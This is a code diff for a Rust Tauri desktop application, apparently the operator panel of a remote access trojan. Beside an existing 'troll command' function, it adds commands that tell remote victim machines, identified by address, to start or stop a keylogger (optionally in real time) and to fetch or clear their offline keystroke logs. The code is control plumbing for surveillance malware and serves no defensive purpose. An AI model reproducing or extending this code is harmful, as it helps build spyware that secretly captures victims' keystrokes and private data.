@@ -1093,3 +1093,68 @@ pub async fn send_troll_command(
 
     Ok("Troll command sent".to_string())
 }
+
+#[tauri::command]
+pub async fn start_keylogger(
+    addr: &str,
+    realtime: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartKeylogger(addr.parse().unwrap(), realtime),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Keylogger started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_keylogger(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopKeylogger(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Keylogger stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn get_offline_logs(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetOfflineLogs(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Offline logs requested".to_string())
+}
+
+#[tauri::command]
+pub async fn clear_offline_logs(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::ClearOfflineLogs(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Offline logs cleared".to_string())
+}
